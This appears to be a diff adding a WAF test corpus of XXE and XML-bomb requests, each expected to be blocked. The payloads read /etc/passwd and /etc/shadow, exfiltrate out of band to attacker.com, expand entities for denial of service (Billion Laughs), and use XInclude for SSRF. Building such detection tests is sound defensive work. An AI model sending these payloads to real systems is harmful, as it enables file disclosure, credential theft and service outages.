@@ -1,0 +1,30 @@
+# XXE / XML bomb corpus — EXPECT:block
+# XML External Entity attacks, denial of service via entity expansion,
+# parameter entities, SVG/Office-document XXE, and out-of-band exfiltration.
+# No EXPECT-RULE — CRS XXE coverage varies; rely on HTTP status in detect mode.
+
+## Classic XXE (file read)
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
+POST /api/xml | Content-Type: text/xml | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><root>&xxe;</root>
+
+## Parameter entity XXE (blind OOB)
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/collect"> %xxe;]><root>data</root>
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><root>data</root>
+
+## Billion Laughs / quadratic blowup (DoS)
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><root>&lol9;</root>
+
+## SVG XXE (file read via vector image)
+POST /api/upload/svg | Content-Type: image/svg+xml | <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>
+
+## XXE via SOAP
+POST /api/soap | Content-Type: text/xml; charset=utf-8 | <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>
+
+## DOCTYPE without entity (protocol violation, often flagged)
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo><root>data</root>
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><root>data</root>
+
+## XInclude (SSRF via include)
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>
+POST /api/xml | Content-Type: application/xml | <?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://internal/secret" parse="text"/></root>
